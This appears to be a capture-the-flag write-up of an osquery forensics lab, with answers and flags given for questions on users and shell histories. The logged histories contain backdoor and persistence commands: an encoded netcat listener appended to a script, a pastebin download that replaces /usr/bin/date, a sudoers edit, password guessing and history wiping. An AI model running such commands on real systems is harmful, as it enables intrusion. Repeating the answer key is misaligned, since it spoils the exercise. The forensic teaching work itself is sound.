#### 1. Shell_history and Users Table Basics

----

```sh
osquery> select * from users;
+-------+-------+------------+------------+-------------------+------------------------------------+----------------------+-------------------+------+
| uid   | gid   | uid_signed | gid_signed | username          | description                        | directory            | shell             | uuid |
+-------+-------+------------+------------+-------------------+------------------------------------+----------------------+-------------------+------+
| 0     | 0     | 0          | 0          | root              | root                               | /root                | /bin/bash         |      |
| 1     | 1     | 1          | 1          | daemon            | daemon                             | /usr/sbin            | /usr/sbin/nologin |      |
| 2     | 2     | 2          | 2          | bin               | bin                                | /bin                 | /usr/sbin/nologin |      |
| 3     | 3     | 3          | 3          | sys               | sys                                | /dev                 | /usr/sbin/nologin |      |
| 4     | 65534 | 4          | 65534      | sync              | sync                               | /bin                 | /bin/sync         |      |
| 5     | 60    | 5          | 60         | games             | games                              | /usr/games           | /usr/sbin/nologin |      |
| 6     | 12    | 6          | 12         | man               | man                                | /var/cache/man       | /usr/sbin/nologin |      |
| 7     | 7     | 7          | 7          | lp                | lp                                 | /var/spool/lpd       | /usr/sbin/nologin |      |
| 8     | 8     | 8          | 8          | mail              | mail                               | /var/mail            | /usr/sbin/nologin |      |
| 9     | 9     | 9          | 9          | news              | news                               | /var/spool/news      | /usr/sbin/nologin |      |
| 10    | 10    | 10         | 10         | uucp              | uucp                               | /var/spool/uucp      | /usr/sbin/nologin |      |
| 13    | 13    | 13         | 13         | proxy             | proxy                              | /bin                 | /usr/sbin/nologin |      |
| 33    | 33    | 33         | 33         | www-data          | www-data                           | /var/www             | /usr/sbin/nologin |      |
| 34    | 34    | 34         | 34         | backup            | backup                             | /var/backups         | /usr/sbin/nologin |      |
| 38    | 38    | 38         | 38         | list              | Mailing List Manager               | /var/list            | /usr/sbin/nologin |      |
| 39    | 39    | 39         | 39         | irc               | ircd                               | /var/run/ircd        | /usr/sbin/nologin |      |
| 41    | 41    | 41         | 41         | gnats             | Gnats Bug-Reporting System (admin) | /var/lib/gnats       | /usr/sbin/nologin |      |
| 65534 | 65534 | 65534      | 65534      | nobody            | nobody                             | /nonexistent         | /usr/sbin/nologin |      |
| 100   | 102   | 100        | 102        | systemd-timesync  | systemd Time Synchronization,,,    | /run/systemd         | /bin/false        |      |
| 101   | 103   | 101        | 103        | systemd-network   | systemd Network Management,,,      | /run/systemd/netif   | /bin/false        |      |
| 102   | 104   | 102        | 104        | systemd-resolve   | systemd Resolver,,,                | /run/systemd/resolve | /bin/false        |      |
| 103   | 105   | 103        | 105        | systemd-bus-proxy | systemd Bus Proxy,,,               | /run/systemd         | /bin/false        |      |
| 104   | 65534 | 104        | 65534      | _apt              |                                    | /nonexistent         | /bin/false        |      |
| 105   | 107   | 105        | 107        | messagebus        |                                    | /var/run/dbus        | /bin/false        |      |
| 106   | 65534 | 106        | 65534      | sshd              |                                    | /var/run/sshd        | /usr/sbin/nologin |      |
| 107   | 111   | 107        | 111        | ftp               | ftp daemon,,,                      | /srv/ftp             | /bin/false        |      |
| 1000  | 1000  | 1000       | 1000       | karen             | ,,,                                | /home/karen          | /bin/zsh          |      |
| 1001  | 1001  | 1001       | 1001       | john              | ,,,                                | /home/john           | /bin/bash         |      |
| 1002  | 1002  | 1002       | 1002       | smith             | ,,,                                | /home/smith          | /bin/bash         |      |
| 1003  | 1003  | 1003       | 1003       | bob               | ,,,                                | /home/bob            | /bin/bash         |      |
+-------+-------+------------+------------+-------------------+------------------------------------+----------------------+-------------------+------+
osquery> 
```

----

```sh
osquery> select * from shell_history where uid = 1001;
+------+------+------------------------------------------------+--------------------------+
| uid  | time | command                                        | history_file             |
+------+------+------------------------------------------------+--------------------------+
| 1001 | 0    | ls -l                                          | /home/john/.bash_history |
| 1001 | 0    | pwd                                            | /home/john/.bash_history |
| 1001 | 0    | date                                           | /home/john/.bash_history |
| 1001 | 0    | echo "FLAG 1/2: efa91742f0efdc00 " > /tmp/flag | /home/john/.bash_history |
| 1001 | 0    | Exit                                           | /home/john/.bash_history |
+------+------+------------------------------------------------+--------------------------+
osquery> 
```

----

```sh
osquery> select * from shell_history;
W0725 23:19:52.798794   105 virtual_table.cpp:987] The shell_history table returns data based on the current user by default, consider JOINing against the users table
W0725 23:19:52.798851   105 virtual_table.cpp:1002] Please see the table documentation: https://osquery.io/schema/#shell_history
+-----+------+--------------------------------------------------------+---------------------+
| uid | time | command                                                | history_file        |
+-----+------+--------------------------------------------------------+---------------------+
| 0   | 0    | ls -l                                                  | /root/.bash_history |
| 0   | 0    | pwd                                                    | /root/.bash_history |
| 0   | 0    | date                                                   | /root/.bash_history |
| 0   | 0    | cd /etc/                                               | /root/.bash_history |
| 0   | 0    | vim shadow                                             | /root/.bash_history |
| 0   | 0    | ls -la                                                 | /root/.bash_history |
| 0   | 0    | echo "Flag 2/2 a622073278351679" > /tmp/flag           | /root/.bash_history |
| 0   | 0    | ps -ef                                                 | /root/.bash_history |
| 0   | 0    | netstat -tpln                                          | /root/.bash_history |
| 0   | 0    | echo "smith ALL=NOPASSWD:/usr/bin/wget" >>/etc/sudoers | /root/.bash_history |
| 0   | 0    | cd /tmp                                                | /root/.bash_history |
| 0   | 0    | ls -al                                                 | /root/.bash_history |
| 0   | 0    | tar -zcvf logs.tar.gz logs                             | /root/.bash_history |
| 0   | 0    | rm -rf *                                               | /root/.bash_history |
+-----+------+--------------------------------------------------------+---------------------+
osquery> 
```

----

```sh
osquery> select * from shell_history where uid = 1003;
+------+------+----------------------------------------------------------+-------------------------+
| uid  | time | command                                                  | history_file            |
+------+------+----------------------------------------------------------+-------------------------+
| 1003 | 0    | date                                                     | /home/bob/.bash_history |
| 1003 | 0    | pwd                                                      | /home/bob/.bash_history |
| 1003 | 0    | whoami                                                   | /home/bob/.bash_history |
| 1003 | 0    | sudo                                                     | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | su smith                                                 | /home/bob/.bash_history |
| 1003 | 0    | exit                                                     | /home/bob/.bash_history |
| 1003 | 0    | date                                                     | /home/bob/.bash_history |
| 1003 | 0    | cd /public/                                              | /home/bob/.bash_history |
| 1003 | 0    | cd resources                                             | /home/bob/.bash_history |
| 1003 | 0    | echo -n "bmMgLWwgMzkwMDA=" | base64 -d >> configcheck.sh | /home/bob/.bash_history |
| 1003 | 0    | cd /tmp/                                                 | /home/bob/.bash_history |
| 1003 | 0    | rm -rf *                                                 | /home/bob/.bash_history |
| 1003 | 0    | exit                                                     | /home/bob/.bash_history |
| 1003 | 0    |                                                          | /home/bob/.bash_history |
+------+------+----------------------------------------------------------+-------------------------+
osquery> 
```

----

```sh
osquery> select * from shell_history where uid = 1002;
+------+------+-------------------------------------------------------+---------------------------+
| uid  | time | command                                               | history_file              |
+------+------+-------------------------------------------------------+---------------------------+
| 1002 | 0    | ls -l                                                 | /home/smith/.bash_history |
| 1002 | 0    | pwd                                                   | /home/smith/.bash_history |
| 1002 | 0    | cat /etc/passwd                                       | /home/smith/.bash_history |
| 1002 | 0    | wget https://pastebin.com/xyhksdshenckas -o script.sh | /home/smith/.bash_history |
| 1002 | 0    | ls -l                                                 | /home/smith/.bash_history |
| 1002 | 0    | chmod +x script.sh                                    | /home/smith/.bash_history |
| 1002 | 0    | cd /usr/bin                                           | /home/smith/.bash_history |
| 1002 | 0    | sudo wget https://pastebin.com/xyhksdshenckax -o date | /home/smith/.bash_history |
| 1002 | 0    | chmod +x date                                         | /home/smith/.bash_history |
| 1002 | 0    | mv scripts.sh /tmp/                                   | /home/smith/.bash_history |
+------+------+-------------------------------------------------------+---------------------------+
osquery> 
```

----

```sh
osquery> select * from shell_history where uid = 1000;
+------+------------+-------------------------------------------------------+--------------------------+
| uid  | time       | command                                               | history_file             |
+------+------------+-------------------------------------------------------+--------------------------+
| 1000 | 1558170000 |  takebackup.sh                                        | /home/karen/.zsh_history |
| 1000 | 1558170050 |  cp ssh remotecon                                     | /home/karen/.zsh_history |
| 1000 | 1558170500 |  killall ssh && exit                                  | /home/karen/.zsh_history |
| 1000 | 1558256400 |  takebackup.sh                                        | /home/karen/.zsh_history |
| 1000 | 1558256500 |  copy /media/sbd/id_rsa .                             | /home/karen/.zsh_history |
| 1000 | 1558256505 |  chmod 600 id_rsa                                     | /home/karen/.zsh_history |
| 1000 | 1558256506 |  exit                                                 | /home/karen/.zsh_history |
| 1000 | 1558342800 |  takebackup.sh                                        | /home/karen/.zsh_history |
| 1000 | 1558342900 |  remotecon -i id_rsa 10.10.10.2                       | /home/karen/.zsh_history |
| 1000 | 1558343900 |  exit                                                 | /home/karen/.zsh_history |
| 1000 | 1558429400 |  takebackup.sh                                        | /home/karen/.zsh_history |
| 1000 | 1558429600 |  date                                                 | /home/karen/.zsh_history |
| 1000 | 1558429601 |  echo "Tue May 21 07:21:53 UTC 2019" > /tmp/timestamp | /home/karen/.zsh_history |
| 1000 | 1558429605 |  rm ~/.zsh_history                                    | /home/karen/.zsh_history |
+------+------------+-------------------------------------------------------+--------------------------+
osquery> 
```

----

```sh
osquery> select * from shell_history where uid = 1001;
+------+------+------------------------------------------------+--------------------------+
| uid  | time | command                                        | history_file             |
+------+------+------------------------------------------------+--------------------------+
| 1001 | 0    | ls -l                                          | /home/john/.bash_history |
| 1001 | 0    | pwd                                            | /home/john/.bash_history |
| 1001 | 0    | date                                           | /home/john/.bash_history |
| 1001 | 0    | echo "FLAG 1/2: efa91742f0efdc00 " > /tmp/flag | /home/john/.bash_history |
| 1001 | 0    | Exit                                           | /home/john/.bash_history |
+------+------+------------------------------------------------+--------------------------+
osquery> 
```

```sh
osquery> select * from shell_history;
W0725 23:34:50.563851   105 virtual_table.cpp:987] The shell_history table returns data based on the current user by default, consider JOINing against the users table
W0725 23:34:50.563881   105 virtual_table.cpp:1002] Please see the table documentation: https://osquery.io/schema/#shell_history
+-----+------+--------------------------------------------------------+---------------------+
| uid | time | command                                                | history_file        |
+-----+------+--------------------------------------------------------+---------------------+
| 0   | 0    | ls -l                                                  | /root/.bash_history |
| 0   | 0    | pwd                                                    | /root/.bash_history |
| 0   | 0    | date                                                   | /root/.bash_history |
| 0   | 0    | cd /etc/                                               | /root/.bash_history |
| 0   | 0    | vim shadow                                             | /root/.bash_history |
| 0   | 0    | ls -la                                                 | /root/.bash_history |
| 0   | 0    | echo "Flag 2/2 a622073278351679" > /tmp/flag           | /root/.bash_history |
| 0   | 0    | ps -ef                                                 | /root/.bash_history |
| 0   | 0    | netstat -tpln                                          | /root/.bash_history |
| 0   | 0    | echo "smith ALL=NOPASSWD:/usr/bin/wget" >>/etc/sudoers | /root/.bash_history |
| 0   | 0    | cd /tmp                                                | /root/.bash_history |
| 0   | 0    | ls -al                                                 | /root/.bash_history |
| 0   | 0    | tar -zcvf logs.tar.gz logs                             | /root/.bash_history |
| 0   | 0    | rm -rf *                                               | /root/.bash_history |
+-----+------+--------------------------------------------------------+---------------------+
osquery> 
```

----

###### Questions

- How many non-system and non-root users are present on the system?

```
# select * from users;
4
karen, john, smith, bob
```

----

- Which user is not using the bash shell?

```
# select * from users;
karen
```

----

- Where is the history file for user "John" is located? Provide the absolute path of the directory (also add the last /).

```
# select * from shell_history where uid = 1001;
/home/john/
```

----

- A sensitive file was edited by the root user. What is the name of that file? Provide the full path.

```
# select * from shell_history;
/etc/sudoers
```

----

- Which user has installed a possible backdoor?

```
# select * from shell_history where uid = 1003;
bob
```

----

- Where is this backdoor kept on the local machine? Provide only the name of the directory.

```
# select * from shell_history where uid = 1003;
resources
```

----

- A suspicious program is installed on the system by a sudoer user. Where was this program hosted online? Provide the full URL.

```
# select * from shell_history where uid = 1002;
https://pastebin.com/xyhksdshenckax
```

----

- A specific user logs into this machine every day at the same time. Which user is that? provide username. 

```
# select * from shell_history where uid = 1000;
karen
```

----

- On what time the user logs into the system? Provide time in HH:MM:SS GMT format.

```
# https://www.epochconverter.com/
# Saturday, May 18, 2019 9:00:00 AM
09:00:00
```

----

- One of the users tried to guess the password for another user. What is the name of that user?

```
# select * from shell_history where uid = 1003 ;
bob
```

- One of the users also has another machine on another private network. What is the IP of that machine?

```
# select * from shell_history where uid = 1000;
10.10.10.2
```

- Retrieve the hidden flag.

```
# select * from shell_history where uid = 1001;
# select * from shell_history;
efa91742f0efdc00a622073278351679
```  

----

###### Reference

- [osquery schema](https://osquery.io/schema/3.3.2)

----

EOF